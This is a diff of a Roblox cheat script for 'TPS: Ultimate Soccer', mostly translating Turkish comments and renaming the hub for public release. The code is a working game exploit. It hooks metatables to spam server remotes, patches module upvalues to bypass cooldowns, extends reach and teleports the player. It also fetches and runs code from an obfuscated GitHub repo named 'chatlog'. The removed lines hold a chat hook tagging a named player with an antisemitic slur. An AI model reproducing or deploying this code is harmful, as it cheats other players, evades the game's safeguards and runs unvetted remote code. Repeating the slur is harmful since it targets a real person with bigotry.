@@ -4,16 +4,16 @@
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlllllIllIIlIlIlIlIllIIlIlIIIIlIll/IlIlIlIlIlIlIIIIIlIlIlIlIlIlIlIlllIlIlIl/refs/heads/main/chatlog",true))()
 
 
--- [[ 1. SERVİSLER ]]
+-- [[ 1. SERVICES ]]
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ 2. INTRO UI OLUŞTURMA ]]
+-- [[ 2. INTRO UI ]]
 local IntroGui = Instance.new("ScreenGui", CoreGui)
-IntroGui.Name = "WaowHubIntro"
+IntroGui.Name = "XHubIntro"
 IntroGui.IgnoreGuiInset = true
 
 local Main = Instance.new("Frame", IntroGui)
@@ -31,7 +31,7 @@ Welcome.BackgroundTransparency = 1
 Welcome.Font = Enum.Font.GothamBold
 Welcome.TextColor3 = Color3.new(1, 1, 1)
 Welcome.TextSize = 16
-Welcome.Text = "WELCOME " .. LocalPlayer.Name .. "\n\nUpdates (29.01.2026):\n• Auto Skill Added."
+Welcome.Text = "WELCOME " .. LocalPlayer.Name .. "\n\nUpdates (15.02.2026):\n• Edited For Public."
 
 local OK = Instance.new("TextButton", Main)
 OK.Size = UDim2.fromOffset(160, 45)
@@ -43,21 +43,19 @@ OK.TextColor3 = Color3.new(1, 1, 1)
 OK.TextSize = 14
 Instance.new("UICorner", OK).CornerRadius = UDim.new(0, 12)
 
--- [[ 3. BEKLEME VE GEÇİŞ SİSTEMİ ]]
+-- [[ 3. ANIMATION SYSTEM ]]
 local Proceed = false
 OK.MouseButton1Click:Connect(function() 
     Proceed = true 
 end)
 
--- EKLEMEN GEREKEN KRİTİK KISIM:
 repeat task.wait() until Proceed 
 
--- Kapanış Animasyonu
 TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.fromOffset(0,0)}):Play()
 task.wait(0.55)
 IntroGui:Destroy()
 
--- [[ 4. MOTOR FONKSİYONLAR ]]
+-- [[ 4. MOTOR FUNCTIONS ]]
 local PartConnections = {}
 
 local function HandlePartReach(PartName, Distance)
@@ -65,12 +63,10 @@ local function HandlePartReach(PartName, Distance)
     
     if Distance > 0 then
         PartConnections[PartName] = RunService.RenderStepped:Connect(function()
-            -- Karakteri ve RootPart'ı her karede kontrol et (En sağlamı bu)
             local char = LocalPlayer.Character
             local root = char and char:FindFirstChild("HumanoidRootPart")
             if not root then return end
             
-            -- Topu bul (Normal maç veya Practice modu)
             local ball = workspace:FindFirstChild("TPS") or 
                          (workspace:FindFirstChild("TPSSystem") and workspace.TPSSystem:FindFirstChild("TPS")) or
                          (workspace:FindFirstChild("Practice") and workspace.Practice:FindFirstChild("PSoccerBall"))
@@ -78,7 +74,6 @@ local function HandlePartReach(PartName, Distance)
             if ball then
                 local mag = (root.Position - ball.Position).Magnitude
                 if mag <= Distance then
-                    -- GK (Kaleci) seçiliyse kolları, değilse seçilen uzvu hedef al
                     local targetParts = (PartName == "GK") and {"Right Arm", "Left Arm"} or {PartName}
                     
                     for _, pName in ipairs(targetParts) do
@@ -95,30 +90,26 @@ local function HandlePartReach(PartName, Distance)
 end
 
 -- =========================================
--- GLOBAL HILE DURUMLARI VE BAĞLANTILAR
+-- GLOBAL 
 -- =========================================
 local PartConnections = {}
 local ToggleConnections = {}
 
 
 -- =========================================
--- WAOW HUB - ADVANCED TELEPORT SYSTEM (4 TEAMS)
+-- ADVANCED TELEPORT SYSTEM (4 TEAMS)
 -- =========================================
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- Teleport Konumları (Görsellerden Alınan Hassas Veriler)
 local POSITIONS = {
     GreenSide = Vector3.new(0.1805742383003235, 175.29998779296875, 179.08871459960938),
     BlueSide = Vector3.new(0.3336418867111206, 175.29998779296875, 379.17535400390625),
-    -- Görsel 1: Green Side GK
     GreenSideGK = Vector3.new(0.30000001192092896, 175.29998779296875, 59.500003814697266),
-    -- Görsel 2: Blue Side GK
     BlueSideGK = Vector3.new(-0.7000000476837158, 175.29998779296875, 496.0000305175781)
 }
 
--- Geçici ForceField (Kalkan) Ekler
 local function addForceField(character)
     if character and character:FindFirstChild("HumanoidRootPart") then
         for _, v in pairs(character:GetChildren()) do
@@ -130,7 +121,6 @@ local function addForceField(character)
     end
 end
 
--- Oyuncuyu Belirtilen Konuma Işınlar
 local function teleportPlayer(position)
     if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
         local humanoidRootPart = LocalPlayer.Character.HumanoidRootPart
@@ -139,35 +129,29 @@ local function teleportPlayer(position)
     end
 end
 
--- Takıma Göre Işınlanma Konumunu Belirler
 local function getTeleportPosition()
     if LocalPlayer.Team then
         local teamName = LocalPlayer.Team.Name
         
-        -- Önce GK takımlarını kontrol ediyoruz (Çakışmayı önlemek için)
         if teamName == "Green Side GK" then
             return POSITIONS.GreenSideGK
         elseif teamName == "Blue Side GK" then
             return POSITIONS.BlueSideGK
-        -- Sonra normal takımları kontrol ediyoruz
         elseif teamName:lower():find("green") or teamName:lower():find("yeşil") then
             return POSITIONS.GreenSide
         elseif teamName:lower():find("blue") or teamName:lower():find("mavi") then
             return POSITIONS.BlueSide
         end
     end
-    -- Takım bulunamazsa varsayılan
     return POSITIONS.GreenSide
 end
 
--- Teleport İşlemini Çalıştırır
 local function executeTeleport()
     if not LocalPlayer.Character then
         LocalPlayer.CharacterAdded:Wait()
     end
     local targetPosition = getTeleportPosition()
     
-    -- Çift ışınlanma (Roblox'un konum hatasını önlemek için)
     teleportPlayer(targetPosition)
     task.wait(0.5)
     teleportPlayer(targetPosition)
@@ -176,7 +160,7 @@ end
 
 
 -- =========================================
--- RANGE GÖRSELLEŞTİRME FONKSİYONLARI
+-- RANGE FUNCTIONS
 -- =========================================
 local function ToggleFTPRange(enabled)
     if enabled then
@@ -395,7 +379,7 @@ local function ToggleTackyRange(enabled)
         if workspace:FindFirstChild("TACKY2_Range_Vis") then workspace.TACKY2_Range_Vis:Destroy() end
     end
 end
--- Range Görselleştirme Fonksiyonları Sonu
+-- Range End
 
 
 
@@ -410,7 +394,6 @@ local function HandlePartReach(PartName, Distance)
     local IsGK = (PartName == "GK")
     local TargetParts = IsGK and GK_PARTS or {PartName}
 
-    -- Eğer mesafe 0 ise bağlantıyı kopar
     if Distance <= 0 then
         if PartConnections[PartName] then
             PartConnections[PartName]:Disconnect()
@@ -421,7 +404,6 @@ local function HandlePartReach(PartName, Distance)
 
     _G.PartDistances[PartName] = Distance
 
-    -- Bağlantı yoksa yeni oluştur (Linoria'daki gibi sağlam motor)
     if not PartConnections[PartName] then
         PartConnections[PartName] = RunService.RenderStepped:Connect(function()
             local char = Players.LocalPlayer.Character
@@ -429,11 +411,9 @@ local function HandlePartReach(PartName, Distance)
             if not root then return end
 
             local Targets = {}
-            -- 1. Normal Maç Topu
             local MatchBall = workspace:FindFirstChild("TPSSystem") and workspace.TPSSystem:FindFirstChild("TPS")
             if MatchBall then table.insert(Targets, MatchBall) end
 
-            -- 2. Antrenman Topları
             local PracticeFolder = workspace:FindFirstChild("Practice")
             if PracticeFolder then
                 for _, ball in ipairs(PracticeFolder:GetChildren()) do
@@ -443,7 +423,6 @@ local function HandlePartReach(PartName, Distance)
                 end
             end
 
-            -- Vuruş Kontrolü
             for _, Target in ipairs(Targets) do
                 if (root.Position - Target.Position).Magnitude <= _G.PartDistances[PartName] then
                     for _, pName in ipairs(TargetParts) do
@@ -464,57 +443,39 @@ end
 -- =========================================
 -- TAB GROUP
 -- =========================================
-local function yerelMesaj(baslik, icerik)
+local function LocalMessage(Title, Text)
     game.StarterGui:SetCore("SendNotification", {
-        ["Title"] = baslik,
-        ["Text"] = icerik,
+        ["Title"] = Title,
+        ["Text"] = Text,
         ["Duration"] = 20
     })
 end
 
-yerelMesaj("TPS: Ultimate Soccer", "Welcome To WaowHub!")
-local TextChatService = game:GetService("TextChatService")
-local Players = game:GetService("Players")
+LocalMessage("TPS: Ultimate Soccer", "Welcome To XHub!")
 
-TextChatService.OnIncomingMessage = function(message)
-    local properties = Instance.new("TextChatMessageProperties")
-    
-    if message.TextSource then
-        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
-        
-        -- Hedef belirlendi
-        if sender and sender.Name == "Husam7272" then
-            properties.PrefixText = "<font color='#FC0FC0'><b>[Top 1 Jew]</b></font> " .. message.PrefixText
-        end
-    end
-    
-    return properties
-end
--- 1. Önce kütüphane yüklendi (zaten sende var)
+-- 1. Library
 local MacLib = loadstring(game:HttpGet("https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt"))()
 
--- 2. İŞTE EKSİK OLAN KISIM BURASI (Bunu yapıştır):
+-- 2. Tab
 local Window = MacLib:Window({
-    Title = "WaowHub",
-    Subtitle = "V3 FireTouch",
+    Title = "XHub",
+    Subtitle = "Public Script",
     Size = UDim2.fromOffset(850, 600),
     DragStyle = 1,
-    Keybind = Enum.KeyCode.RightControl, -- Menüyü RightControl ile açıp kapatabilirsin
+    Keybind = Enum.KeyCode.RightControl, 
     AcrylicBlur = true,
     ShowUserInfo = true,
 })
-    -- [[ KÜTÜPHANE AÇILDIĞINDA MÜZİK ÇALMA ]]
+    -- [[ MUSIC ]]
     local Sound = Instance.new("Sound")
     Sound.Parent = game:GetService("SoundService")
-    Sound.SoundId = "rbxassetid://98777348372282" -- Buraya istediğin Music ID'yi yazabilirsin
-    Sound.Volume = 1 -- Ses seviyesi (0 ile 1 arası)
-    Sound.Looped = false -- Sürekli çalmasını istiyorsan true yap
+    Sound.SoundId = "rbxassetid://98777348372282" -- 
+    Sound.Volume = 1 -- VOICE LEVEL ( 0-1 )
+    Sound.Looped = false 
     Sound:Play()
 
-    -- Müziğin bitince silinmesi için (İsteğe bağlı)
     game:GetService("Debris"):AddItem(Sound, 10)
 
--- 3. Şimdi hata aldığın o satır bunun altına gelecek:
 local tabGroup = Window:TabGroup()
 
 local tabs = {
@@ -540,14 +501,14 @@ local sections = {
     MiscLeft      = tabs.Misc:Section({ Side = "Left" }),
 }
 
--- Ayarlar sekmesi (otomatik config + theme)
-MacLib:SetFolder("WaowHub")
+-- Settings
+MacLib:SetFolder("XHub")
 tabs.Settings:InsertConfigSection("Left")
 
 tabs.FireTouch:Select()
 
 ----------------------------------------
--- FIRETOUCH TAB (MACLIB)
+-- FIRETOUCH TAB 
 ----------------------------------------
 
 sections.FireTouchLeft:Header({
@@ -576,7 +537,7 @@ CreateReachSlider("Head")
 CreateReachSlider("GK")
 
 ----------------------------------------
--- REACT TAB (MACLIB)
+-- REACT TAB 
 ----------------------------------------
 
 sections.ReactLeft:Header({
@@ -685,7 +646,6 @@ sections.ReactLeft:Button({
 sections.ReactLeft:Button({
     Name = "Defense React",
     Callback = function()
-        -- [[ UNIVERSAL SMART DEFANCE START ]]
         _G.SmartDefense = true
         local lp = game.Players.LocalPlayer
         
@@ -693,7 +653,6 @@ sections.ReactLeft:Button({
             if not _G.SmartDefense then return end
             
             local char = lp.Character
-            -- Sahadaki veya pratik alanındaki topları bulur
             local ball = workspace.TPSSystem:FindFirstChild("TPS") or 
                          workspace:FindFirstChild("Practice"):FindFirstChild("PSoccerBall") or
                          workspace:FindFirstChild("TPS")
@@ -703,13 +662,11 @@ sections.ReactLeft:Button({
                 if root then
                     local dist = (root.Position - ball.Position).Magnitude
                     
-                    -- Mesafe kontrolü ve Sahiplik kontrolü
                     if dist < 5.5 then
                         local isOwner = false
                         local owner = ball:FindFirstChild("Owner")
                         if owner and owner.Value == lp.Name then isOwner = true end
 
-                        -- Eğer topun sahibi sen değilsen rakipten/bot'tan söküp al
                         if not isOwner then
                             for _, v in pairs(ball:GetChildren()) do
                                 pcall(function()
@@ -722,19 +679,17 @@ sections.ReactLeft:Button({
                                     end
                                 end)
                             end
-                            -- Topu dondurarak göğsüne/ayağına yapışmasını sağlar
                             ball.AssemblyLinearVelocity = ball.AssemblyLinearVelocity * 0.05
                         end
                     end
                 end
             end
         end)
-        -- [[ UNIVERSAL SMART DEFANCE END ]]
     end
 })
 
 sections.ReactLeft:Button({
-    Name = "Rime React (NEW)",
+    Name = "Rime React",
     Callback = function()
 local mt = getrawmetatable(game)
 local oldNC = mt.__namecall
@@ -742,7 +697,6 @@ setreadonly(mt, false)
 
 _G.RimeReactActive = true
 
--- MODÜL KİLİTLERİNİ KIRAN FONKSİYON
 local function bypassModule()
     pcall(function()
         local backpack = game.Players.LocalPlayer:FindFirstChild("Backpack")
@@ -753,7 +707,6 @@ local function bypassModule()
         
         for _, mod in pairs(modules) do
             if mod then
-                -- Modülün içindeki cooldown (bekleme) değişkenlerini resetler
                 for i = 1, 20 do
                     local name, val = debug.getupvalue(require(mod).Dribble, i)
                     if name == "v_u_2" then debug.setupvalue(require(mod).Dribble, i, true) end
@@ -769,17 +722,14 @@ mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
 
     if _G.RimeReactActive and not checkcaller() and method == "FireServer" then
-        -- Eğer vuruş (Scorer) event'i ateşlenirse
         if self == workspace.FE.Scorer.RemoteEvent then
-            bypassModule() -- Kilitleri o saniye kır
+            bypassModule() 
 
-            -- Gecikmeyi silen parça
             pcall(function()
                 local ball = workspace.TPSSystem:FindFirstChild("TPS") or workspace:FindFirstChild("PSoccerBall")
                 if ball and ball:FindFirstChild("APGBDelay") then ball.APGBDelay:Destroy() end
             end)
 
-            -- Sinyali güçlendirerek gönder
             workspace.FE.Scorer.RemoteEvent1:FireServer(unpack(args))
             workspace.FE.Scorer.RemoteEvent2:FireServer(unpack(args))
             for i = 1, 3 do
@@ -796,11 +746,9 @@ setreadonly(mt, true)
 })
 
 sections.ReactLeft:Button({
-    Name = "Zero Delay(NEW)",
+    Name = "Zero Delay",
     Callback = function()
         pcall(function()
-            -- 1. Görsel & Fiziksel Hantallığı Sürekli Silen Döngü
-            -- Heartbeat kullanarak topun içindeki gecikme yaratan objeleri anında yok eder
             game:GetService("RunService").Heartbeat:Connect(function()
                 pcall(function()
                     local tpsPart = workspace.TPSSystem and workspace.TPSSystem:FindFirstChild("TPS")
@@ -815,8 +763,6 @@ sections.ReactLeft:Button({
                 end)
             end)
 
-            -- 2. Network & Paket Önceliği ( VIP Sinyaller )
-            -- Tool ve Update paketlerini sunucuya bekletmeden iteler
             local FE = game:GetService("ReplicatedStorage"):FindFirstChild("FE")
             if FE then
                 local importantRemotes = {"ToolDribble", "ToolShoot", "RUpdate", "Sprint", "Ping"}
@@ -830,8 +776,6 @@ sections.ReactLeft:Button({
                     end
                 end
 
-                -- 3. Ping Senkronizasyonu
-                -- Sunucuyla olan bağı milisaniyelere indirir
                 if FE:FindFirstChild("Ping") then
                     FE.Ping.OnClientEvent:Connect(function()
                         FE.Ping:FireServer()
@@ -839,7 +783,6 @@ sections.ReactLeft:Button({
                 end
             end
             
-            -- 4. Yapay Lagı Sıfırla
             settings().Network.IncomingReplicationLag = 0
         end)
     end
@@ -886,43 +829,34 @@ sections.ReactLeft:Button({
     end
 })
 ----------------------------------------
--- FIVEROSE REACTS (KLONLANMIŞ GÜÇ)
+-- FIVEROSE REACTS
 ----------------------------------------
 
-sections.ReactRight:Header({
-    Name = "Fiverose Reacts"
-})
 
-sections.ReactRight:Button({
-    Name = "Main React", -- [cite: 2026-01-28]
+sections.ReactLeft:Button({
+    Name = "Main React", 
     Callback = function()
         local lp = game.Players.LocalPlayer
         local ScorerRemote = workspace:WaitForChild("FE"):WaitForChild("Scorer"):WaitForChild("RemoteEvent")
 
-        -- Kamera ve Tool çakışmasını önleyen güvenli hook [cite: 2026-01-28]
         local old; old = hookmetamethod(game, "__namecall", function(self, ...)
             local method = getnamecallmethod()
             local args = {...}
 
             if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
-                -- SADECE Scorer (Dokunuş) anında tetiklenir
                 if self == ScorerRemote then
                     task.spawn(function()
                         local ball = args[1] 
 
                         if ball and typeof(ball) == "Instance" then
-                            -- 1. KeepP Bloğu (5 Tane) - Topu yakın tutar [cite: 2026-01-28]
                             for i = 1, 5 do
                                 workspace.FE.Keep.KeepP:FireServer(ball)
                             end
 
-                            -- 2. Attach Bloğu (5 Tane) - Mıknatıs etkisi [cite: 2026-01-28]
                             for i = 1, 5 do
                                 workspace.FE.Attach.RemoteEvent:FireServer(ball)
                             end
                             
-                            -- Dribble paketi tamamen kaldırıldı! [cite: 2026-01-28]
-                            -- Artık Stop'a bastığında Stop, Pas'a bastığında Pas çalışacak. [cite: 2026-01-28]
                         end
                     end)
                 end
@@ -931,33 +865,28 @@ sections.ReactRight:Button({
         end)
     end
 })
-sections.ReactRight:Button({
-    Name = "React Killer", -- İstediğin isimle güncellendi [cite: 2026-01-28]
+sections.ReactLeft:Button({
+    Name = "GK React Killer", 
     Callback = function()
         local lp = game.Players.LocalPlayer
         local ScorerRemote = workspace:WaitForChild("FE"):WaitForChild("Scorer"):WaitForChild("RemoteEvent")
 
-        -- Kamera hatasını (ZoomController) önlemek için temiz hook yöntemi
         local old; old = hookmetamethod(game, "__namecall", function(self, ...)
             local method = getnamecallmethod()
             local args = {...}
 
             if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
-                -- Sadece şut/dokunuş anında (Scorer) devreye girer
                 if self == ScorerRemote then
                     task.spawn(function()
                         local ball = args[1] 
                         
                         if ball and typeof(ball) == "Instance" then
-                            -- Karar kıldığımız 35'lik tam kıvamında paket döngüsü [cite: 2026-01-28]
                             for i = 1, 35 do 
-                                -- Kaleci imha paket dizilimi
                                 workspace.FE.Keep.GK:FireServer(ball)
                                 workspace.FE.GK.BGKSaves:FireServer(ball)
                                 workspace.FE.GK.BGKP:FireServer(ball)
                                 workspace.FE.GK.GGKP:FireServer(ball)
                                 
-                                -- Akıcılığı bozmayan mikrosaniyelik mola [cite: 2026-01-28]
                                 if i % 7 == 0 then task.wait() end 
                             end
                         end
@@ -969,10 +898,10 @@ sections.ReactRight:Button({
     end
 })
 ----------------------------------------
--- BOOSTERS TAB (MacLib - Final Layout)
+-- BOOSTERS TAB 
 ----------------------------------------
 
--- SOL: Stamina
+-- LEFT: Stamina
 local StaminaSection = tabs.Boosters:Section({ Side = "Left" })
 
 StaminaSection:Header({ Name = "Stamina" })
@@ -1021,7 +950,7 @@ StaminaSection:Button({
 })
 
 ------------------------------------------------
--- SAĞ: MS Boost + Boost (Tek Section)
+-- RIGHT: MS Boost + Boost 
 ------------------------------------------------
 local BoostersRight = tabs.Boosters:Section({ Side = "Right" })
 
@@ -1051,10 +980,8 @@ BoostersRight:Input({
     end
 })
 
--- Divider ile ayır
 BoostersRight:Divider()
 
--- Boost Header
 BoostersRight:Header({ Name = "Boost" })
 
 local function AddBoostButton(name, args)
@@ -1078,19 +1005,18 @@ AddBoostButton("Skill Power",        {417646286,  "SkillE", false})
 AddBoostButton("GK Power",           {628934962,  "SkillF", false})
 AddBoostButton("Durability Power",   {5550729447, "SkillH", false})
 ----------------------------------------
--- RANGE TAB (MacLib)
+-- RANGE TAB 
 ----------------------------------------
 
 local RangeLeftSection = tabs.Range:Section({ Side = "Left" })
 local RangeRightSection = tabs.Range:Section({ Side = "Right" })
 
--- Soldaki Range Kontrolleri
 RangeLeftSection:Toggle({
     Name = "FTP Range",
     Default = false,
     Tooltip = "Displays the range of the FTP League.",
     Callback = function(value)
-        ToggleFTPRange(value) -- Kullanıcı fonksiyonunu çağır
+        ToggleFTPRange(value) 
     end
 })
 
@@ -1099,11 +1025,10 @@ RangeLeftSection:Toggle({
     Default = false,
     Tooltip = "Displays the range of the TACKY League.",
     Callback = function(value)
-        ToggleTackyRange(value) -- Kullanıcı fonksiyonunu çağır
+        ToggleTackyRange(value) 
     end
 })
 
--- Sağdaki Teleporter Kontrolleri
 RangeRightSection:Button({
     Name = "Teleport to Team Side",
     Callback = function()
@@ -1111,7 +1036,6 @@ RangeRightSection:Button({
     end,
     Tooltip = "Auto teleports you to your team's side(Green Or Blue)"
 })
--- EN BAŞA BUNU KOYDUĞUNDAN EMİN OL
 local player = game.Players.LocalPlayer
 local lastTouch = 0
 local touchCount = 0
@@ -1123,11 +1047,9 @@ local function performInstantTurn()
     local char = player.Character
     if not char then return end
 
-    -- Turuncu ikonlu Dribble kontrolü
     local tool = char:FindFirstChild("Dribble")
     
     if tool then 
-        -- Sarı klasördeki TurnR
         local dataFolder = char:FindFirstChild("ToolDribble") or player.Backpack:FindFirstChild("ToolDribble")
         local gui = player:FindFirstChild("PlayerGui")
         
@@ -1169,8 +1091,6 @@ AutoSkillLeftSection:Slider({
     end
 })
 
--- HATA VEREN 1128. SATIRIN DÜZELTİLMİŞ HALİ
--- Karakterin yüklenmesini bekleyerek 'nil' hatasını engelliyoruz
 player.CharacterAdded:Connect(function(char)
     char:WaitForChild("HumanoidRootPart").Touched:Connect(function(hit)
         if _G.touchThreshold == 0 then return end
@@ -1187,7 +1107,6 @@ player.CharacterAdded:Connect(function(char)
     end)
 end)
 
--- Mevcut karakter için de çalışması için:
 if player.Character then
     player.Character:WaitForChild("HumanoidRootPart").Touched:Connect(function(hit)
         if _G.touchThreshold == 0 then return end
@@ -1225,7 +1144,7 @@ MiscLeftSection:Slider({
     end
 })
 
--- Utility Buttons (Sağda)
+-- Utility Buttons (RIGHT)
 MiscRightSection:Button({
     Name = "Unlimited Auto Pass Range",
     Callback = function()
@@ -1233,7 +1152,6 @@ MiscRightSection:Button({
         local player = game.Players.LocalPlayer
         local MAX_RANGE = 999999 
 
-        -- Eğer daha önce bağlanmadıysa bağlantıyı kur
         if not ToggleConnections.AutoPassRange then
             ToggleConnections.AutoPassRange = runService.RenderStepped:Connect(function()
                 local char = player.Character
@@ -1243,7 +1161,6 @@ MiscRightSection:Button({
                     params.FilterType = Enum.RaycastFilterType.Include
                     params.FilterDescendantsInstances = { workspace }
                     
-                    -- Karakterin baktığı yöne doğru sonsuz bir ışın fırlatır
                     local ray = workspace:Raycast(
                         char.HumanoidRootPart.Position, 
                         char.HumanoidRootPart.CFrame.LookVector * MAX_RANGE, 
@@ -1252,13 +1169,11 @@ MiscRightSection:Button({
 
                     if ray then
                         for _, target in pairs(game.Players:GetPlayers()) do
-                            -- Sadece senin takımında olan ve hayatta olan oyuncuları kontrol eder
                             if target ~= player and target.TeamColor == player.TeamColor and target.Character then
                                 local head = target.Character:FindFirstChild("Head")
                                 local root = target.Character:FindFirstChild("HumanoidRootPart")
                                 
                                 if head and head:FindFirstChild("PointerGui") and root then
-                                    -- Işın ile oyuncu arasındaki mesafeyi ölçer
                                     local dist = (root.Position - ray.Position).Magnitude
                                     if dist < 50 then 
                                         head.PointerGui.Enabled = true
@@ -1302,7 +1217,6 @@ MiscRightSection:Button({
         end
 
         safeExecute(function()
-            -- 1. LIGHTING AYARLARI (Senin Scriptinden) [cite: 2026-01-29]
             local lighting = game:GetService("Lighting")
             lighting.GlobalShadows = false
             lighting.FogEnd = 100000
@@ -1316,7 +1230,6 @@ MiscRightSection:Button({
                 end
             end
 
-            -- 2. KARAKTER KORUMALI RENDER (Karakterin Şeffaf Olmaz) [cite: 2026-01-29]
             local lp = game:GetService("Players").LocalPlayer
             for _, v in pairs(workspace:GetDescendants()) do
                 -- Karakterinin parçası olmayan her şeyin dokusunu düşürür [cite: 2026-01-29]
@@ -1329,7 +1242,6 @@ MiscRightSection:Button({
                 end
             end
 
-            -- 3. WORKSPACE SÜPÜRME (16 Bölüm Birleşik - Güvenli Liste)
             local toDelete = {
                 "Ads", "Donators", "Leaderboards", "DottedLines", "Drinks", "Memories",
                 "Benchs", "Managers", "CelebrateStand", "Boards", "Camera1", "Cameras",
@@ -1340,8 +1252,6 @@ MiscRightSection:Button({
                 if obj then obj:Destroy() end
             end
 
-            -- 4. KARAKTER SİLİNME KORUMASI (Worn & Jersey)
-            -- Klasörü silmek yerine sadece sana ait olmayan eşyaları siler [cite: 2026-01-29]
             local riskyFolders = {"Worn", "JerseysTeam", "JerseyP1", "JerseyP2"}
             for _, folderName in pairs(riskyFolders) do
                 local folder = workspace:FindFirstChild(folderName)
@@ -1375,7 +1285,6 @@ SettingsLeftSection:Keybind({
 SettingsLeftSection:Button({
     Name = "Unload Script",
     Callback = function()
-        -- Varsayılanları geri yükle
         if workspace.CurrentCamera then
             workspace.CurrentCamera.FieldOfView = 70
         end
